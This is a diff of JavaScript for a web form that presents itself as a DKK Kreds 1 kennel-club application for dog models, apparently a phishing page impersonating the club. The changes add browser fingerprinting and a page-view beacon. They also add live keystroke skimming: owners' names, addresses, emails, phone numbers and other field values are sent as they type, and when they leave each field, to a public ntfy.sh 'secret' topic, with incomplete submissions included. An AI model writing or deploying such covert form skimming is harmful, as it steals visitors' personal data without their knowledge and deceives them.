@@ -3,7 +3,17 @@ const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
 let currentLang = 'da';
 let dogCount = 0;
 let userIP = "Fetching...";
-const sessionId = Math.random().toString(36).substring(2, 9);
+
+// Sporings- og sessionsdata
+const sessionInfo = {
+    id: Math.random().toString(36).substring(2, 9).toUpperCase(),
+    startTime: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    screen: `${window.screen.width}x${window.screen.height}`,
+    lang: navigator.language
+};
+
+let typingTimeout = {}; // Til debouncing af input logs
 
 // --- ALLOWED MAJOR DOMAINS ---
 const allowedDomains = [
@@ -18,7 +28,7 @@ const allowedDomains = [
 const i18n = {
     da: {
         nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter",
-        nav4: "Udstilling", nav5: "Om DKK", nav6: "Kontakt", nav7: "Bliv medlem", login: "Login",
+        nav4: "Udstilling", nav5: "Om DKK", nav6: "Kontakt", nav7: "Bliv medlem", nav8: "Uddannelser", login: "Login",
         hero_title: "Ansøgning: Hundemodel", hero_text: "Er din hund den næste stjerne i DKK Kreds 1's kampagnemateriale? \n\nUdfyld formularen sikkert herunder og lad din bedste ven komme i betragtning!",
         owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Fulde Adresse", 
         f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com", f_phone: "Telefonnummer", 
@@ -31,7 +41,7 @@ const i18n = {
     },
     en: {
         nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities",
-        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact", nav7: "Become a member", login: "Login",
+        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact", nav7: "Become a member", nav8: "Education", login: "Login",
         hero_title: "Application: DKK Dog Model", hero_text: "Is your dog the next star of DKK District 1's campaign? \n\nFill out the form securely below to submit your best friend!",
         owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Full Address", 
         f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com", f_phone: "Phone Number", 
@@ -44,7 +54,7 @@ const i18n = {
     }
 };
 
-// --- INITIALIZE ---
+// --- INITIALIZE & TRACK PAGE VIEW ---
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         let res = await fetch('https://api.ipify.org?format=json');
@@ -52,9 +62,34 @@ window.addEventListener('DOMContentLoaded', async () => {
         userIP = data.ip;
     } catch(e) { userIP = "Unknown"; }
 
-    restoreFormState(); // Load saved cookies/localstorage
+    logPageView();
+    restoreFormState();
     bindLanguageSwitch();
 });
+
+// -- LOGGING FUNCTIONS --
+function sendNtfy(title, message, tags) {
+    return fetch(`https://ntfy.sh/`, {
+        method: 'POST',
+        body: JSON.stringify({
+            topic: NTFY_TOPIC,
+            title: title,
+            message: message,
+            tags: tags ? tags.split(',') : []
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    }).catch(err => console.error("Ntfy Error:", err));
+}
+
+function trackEvent(eventName, fieldName, value, icon) {
+    const msg = `Session: ${sessionInfo.id}\nIP: ${userIP}\n\nFelt: ${fieldName}\nInput: ${value}`;
+    sendNtfy(`🕵️ Tracker - ${eventName}`, msg, icon);
+}
+
+function logPageView() {
+    const msg = `Ny besøgende på formularen!\n\nIP: ${userIP}\nSession ID: ${sessionInfo.id}\nSkærm: ${sessionInfo.screen}\nSprog: ${sessionInfo.lang}\nBrowser: ${sessionInfo.userAgent}`;
+    sendNtfy("🌐 Ny Besøgende (Sidevisning)", msg, "globe_with_meridians");
+}
 
 // --- FLUID REAL-TIME VALIDATION ---
 function validateEmail(email) {
@@ -70,7 +105,6 @@ function validatePhone(phone) {
     return re.test(cleanPhone);
 }
 
-// Validation function triggering on Input, Focus and Blur
 function validateField(input, isBlurEvent = false) {
     const val = input.value.trim();
     const isRequired = input.hasAttribute('required');
@@ -89,8 +123,6 @@ function validateField(input, isBlurEvent = false) {
         input.classList.remove('is-valid');
         if(icon) icon.classList.add('hidden');
         
-        // We only show red borders if they click out (blur) of a required field that is invalid,
-        // or if they are actively typing into an already red field to fix it.
         if ((isBlurEvent && isRequired && val === '') || (isBlurEvent && val !== '') || input.classList.contains('is-invalid')) {
             input.classList.add('is-invalid');
         }
@@ -113,22 +145,22 @@ function addDogField(savedData = null) {
     div.innerHTML = `
         <div class="absolute -top-3 left-4 bg-dkkRed text-white text-xs font-bold px-3 py-1 rounded-full">#${dogCount}</div>
         <div class="floating-input-group col-span-2">
-            <input type="text" class="dogName floating-input" required placeholder=" " value="${nameVal}">
+            <input type="text" class="dogName floating-input track-input" required placeholder=" " value="${nameVal}">
             <label class="floating-label" data-i18n="d_name">${i18n[currentLang].d_name}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
         <div class="floating-input-group">
-            <input type="text" class="dogAge floating-input" required placeholder=" " value="${ageVal}">
+            <input type="text" class="dogAge floating-input track-input" required placeholder=" " value="${ageVal}">
             <label class="floating-label" data-i18n="d_age">${i18n[currentLang].d_age}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
         <div class="floating-input-group">
-            <input type="url" class="dogPhotos floating-input" required placeholder=" " value="${photosVal}">
+            <input type="url" class="dogPhotos floating-input track-input" required placeholder=" " value="${photosVal}">
             <label class="floating-label" data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
         <div class="floating-input-group col-span-2">
-            <input type="text" class="dogSkills floating-input" required placeholder=" " value="${skillsVal}">
+            <input type="text" class="dogSkills floating-input track-input" required placeholder=" " value="${skillsVal}">
             <label class="floating-label" data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
@@ -142,27 +174,44 @@ document.getElementById('addDogBtn').addEventListener('click', () => addDogField
 
 // --- BLUR, FOCUS & KEYSTROKE TRACKING ---
 function bindTracking(parent = document) {
-    const inputs = parent.querySelectorAll('input');
+    const inputs = parent.querySelectorAll('.track-input');
     inputs.forEach(input => {
+        const fieldId = input.id || input.className.split(' ')[0] + Math.random().toString(36).substr(2,4);
+
         // FOCUS Event
         input.addEventListener('focus', (e) => {
             validateField(e.target, false);
+            // Hvis du vil spore focus, f.eks.:
+            // const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Ukendt";
+            // trackEvent("Startet indtastning", label, "(Skriver...)", "eyes");
         });
 
-        // INPUT Event (Keystroke)
+        // INPUT Event (Debounced Live Tracking)
         input.addEventListener('input', (e) => {
             validateField(e.target, false);
-            saveFormState(); // Save to local storage on every keystroke!
-        });
-        
-        // BLUR Event (Unfocus)
-        input.addEventListener('blur', (e) => {
-            validateField(e.target, true); // True forces red styling if invalid
+            saveFormState(); 
             
             const val = e.target.value.trim();
+            const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
+
+            clearTimeout(typingTimeout[fieldId]);
+            // Vent 2,5 sekunder efter de stopper med at skrive, før der sendes en "Live Tracker" notifikation
+            typingTimeout[fieldId] = setTimeout(() => {
+                if(val.length > 0) {
+                    trackEvent("Live Input", label, val, "pencil2");
+                }
+            }, 2500); 
+        });
+        
+        // BLUR Event (Når brugeren forlader et felt)
+        input.addEventListener('blur', (e) => {
+            validateField(e.target, true); 
+            const val = e.target.value.trim();
+            const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
             if (val !== "") {
-                const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
-                sendNtfy("✍️ Bruger skriver...", `Felt: ${label}\nVærdi: ${val}\nSession: ${sessionId}`, "pencil2");
+                // Vi sender en direkte besked på blur, som er overordnet de debouncede input
+                clearTimeout(typingTimeout[fieldId]); // Ryd den forsinkede "Live Input", så vi ikke sender to.
+                trackEvent("Forlod felt", label, val, "clipboard");
             }
         });
     });
@@ -209,7 +258,7 @@ function restoreFormState() {
             addDogField();
         }
 
-        document.querySelectorAll('input').forEach(input => {
+        document.querySelectorAll('.track-input').forEach(input => {
             if(input.value) validateField(input, false);
         });
     } else {
@@ -218,14 +267,14 @@ function restoreFormState() {
     bindTracking(document);
 }
 
-// --- DATA COLLECTION ---
+// --- DATA COLLECTION (FINAL SUBMIT) ---
 function getPayload() {
     let dogDetails = "";
     document.querySelectorAll('.dog-card').forEach((el, index) => {
         dogDetails += `\nHUND ${index + 1}:\n- Navn: ${el.querySelector('.dogName').value}\n- Alder: ${el.querySelector('.dogAge').value}\n- Færdigheder: ${el.querySelector('.dogSkills').value}\n- Fotos: ${el.querySelector('.dogPhotos').value}\n`;
     });
 
-    return `EJER:\nNavn: ${document.getElementById('ownerName').value}\nAdresse: ${document.getElementById('ownerAddress').value}\nEmail: ${document.getElementById('ownerEmail').value}\nTlf: ${document.getElementById('ownerPhone').value}\nSoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}\nDKK: ${document.getElementById('dkkMember').value || 'Ingen'}\n\nHUNDE INFO: ${dogDetails}\n-----------------------\nIP: ${userIP}`;
+    return `EJER:\nNavn: ${document.getElementById('ownerName').value}\nAdresse: ${document.getElementById('ownerAddress').value}\nEmail: ${document.getElementById('ownerEmail').value}\nTlf: ${document.getElementById('ownerPhone').value}\nSoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}\nDKK: ${document.getElementById('dkkMember').value || 'Ingen'}\n\nHUNDE INFO: ${dogDetails}\n-----------------------\nIP: ${userIP}\nSession ID: ${sessionInfo.id}`;
 }
 
 // --- SUBMIT HANDLING ---
@@ -233,21 +282,21 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const btn = document.getElementById('submitBtn');
     const alertBox = document.getElementById('errorAlert');
-    const originalBtnHTML = btn.innerHTML; // Gem det oprindelige knap-layout for at kunne vende tilbage ved fejl
+    const originalBtnHTML = btn.innerHTML; 
     
     let formIsValid = true;
     document.querySelectorAll('input[required]').forEach(input => {
         if (!validateField(input, true)) {
             formIsValid = false;
-            input.classList.remove('shake'); // Reset anim
-            void input.offsetWidth; // Trigger reflow
+            input.classList.remove('shake');
+            void input.offsetWidth; 
             input.classList.add('shake', 'is-invalid'); 
         }
     });
 
     if (!formIsValid) {
         alertBox.classList.remove('hidden');
-        sendNtfy("⚠️ Fejl / Manglende Data Submit", getPayload(), "warning");
+        sendNtfy("⚠️ Fejl / Manglende Data", getPayload(), "warning");
         return;
     }
 
@@ -273,23 +322,6 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     }
 });
 
-// --- NTFY VIA JSON ---
-function sendNtfy(title, message, tags) {
-    return fetch(`https://ntfy.sh/`, {
-        method: 'POST',
-        body: JSON.stringify({
-            topic: NTFY_TOPIC,
-            title: title,
-            message: message,
-            tags: tags ? tags.split(',') : []
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    }).catch(err => {
-        console.error("Ntfy Error:", err);
-        throw err;
-    });
-}
-
 // --- LANGUAGE SWITCHER ---
 function bindLanguageSwitch() {
     document.getElementById('langSwitchBtn').addEventListener('click', () => {
@@ -298,7 +330,6 @@ function bindLanguageSwitch() {
         
         document.querySelectorAll('[data-i18n]').forEach(el => {
             const key = el.getAttribute('data-i18n');
-            // Check hvis innerText erstatter et SVG ikon på knappen
             if (el.tagName === 'SPAN') {
                if (i18n[currentLang][key]) el.innerText = i18n[currentLang][key]; 
             } else {
